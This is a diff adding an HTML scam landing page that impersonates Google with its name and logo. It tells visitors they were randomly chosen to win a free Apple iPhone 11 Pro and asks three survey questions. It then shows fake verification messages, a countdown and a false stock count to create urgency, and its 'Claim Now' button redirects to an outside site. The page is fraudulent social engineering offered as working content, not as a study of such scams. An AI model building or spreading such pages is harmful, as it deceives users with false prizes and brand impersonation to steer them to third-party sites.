@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <title>Google</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="lander" content="survey">
+  <meta name="description" content="survey">
+  <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+  <link href="./css/app.css" type="text/css" rel="stylesheet"/>
+  <script src="/static/js/zepto.min.js"></script>
+  <script src="/static/js/common.js"></script>
+</head>
+<body>
+<main id="app" v-cloak>
+  <div class="header">
+    <img class="header__logo" src="./img/google.svg" alt="">
+  </div>
+  <div class="instructions" v-show="!showPrize">
+    <h1 class="heading heading--h1">Congratulations!</h1>
+    <p class="paragraph">
+      We want to thank you for choosing Google as your preferred Search Engine. That is why we will select a random
+      Google user that will receive a gift from our beloved partners and sponsors. </p>
+    <p class="paragraph">
+      And today is your lucky day! You are one of 10 randomly selected users who will receive a gift. </p>
+    <p class="paragraph">
+      Your were randomly selected to receive a FREE <em>Apple iPhone 11 Pro</em>.<sup>[1]</sup><br/>
+      <sub>[1] Answer the three questions below to redeem your gift!</sub>
+    </p>
+  </div>
+  <vue-survey
+    :questions='[
+          {
+            title: "Are you satisfied with Google?",
+            answers: [{ text: "Very satisfied" }, { text: "Satisfied" }, { text: "Not satisfied" }],
+          },
+          {
+            title: "Do you recommend Google?",
+            answers: [{ text: "Yes" }, { text: "No" }, { text: "Sometimes" }]
+          },
+          {
+            title: "What do you like the most about Google?",
+            answers: [{ text: "Speed" }, { text: "Privacy" }, { text: "Service" }]
+          },
+        ]'
+    v-show="!showRotator && !showPrize"
+    @finished="showRotator = true"
+  ></vue-survey>
+  <vue-text-rotator
+    :strings='[
+          "Verifying your IP address...",
+          "Checking your answers...",
+          "Checking stock availability...",
+        ]'
+    v-if="showRotator && !showPrize"
+    @finished="showPrize = true"
+  ></vue-text-rotator>
+  <transition name="fade">
+    <div class="prize" v-if="showPrize">
+      <h1 class="heading heading--h1">Congratulations!</h1>
+      <p class="paragraph">
+        <em>Due to limited availability your gift will be reserved for the next <span v-html="countdownMinutes"></span>:<span
+          v-html="countdownSeconds"></span> minutes.</em><sup>[1]</sup><br/>
+        <sub>[1] If you do not claim your gift within this time, it will be given to another Google user.</sub>
+      </p>
+      <h2>Your Gift</h2>
+      <div class="product">
+        <div class="product__information">
+          <img class="product__image"
+               src="./img/default@0.25x.png" alt="">
+          <div class="product__details">
+            <div class="product__title">
+              Apple iPhone 11 Pro
+            </div>
+            <div class="product__normal-price">
+              Normal Price: $1,100.00
+            </div>
+            <div class="product__your-price">
+              Your Price: <em>FREE</em>
+            </div>
+            <div class="product__stock">
+              In stock: <span class="product__stock-amount">2</span><br/>
+              <sub>* Limited stock available</sub>
+            </div>
+          </div>
+        </div>
+        <span class="product__button" onclick="go()">Claim Now </span>
+      </div>
+    </div>
+  </transition>
+</main>
+<script type="text/javascript">window.skip = Number(0)</script>
+<script src="./js/app.js" type="application/javascript"></script>
+<script type="text/javascript">
+           function  go(){
+                  window.location.href="http://www.jb51.net";
+             }
+ </script>
+</body>
+</html>
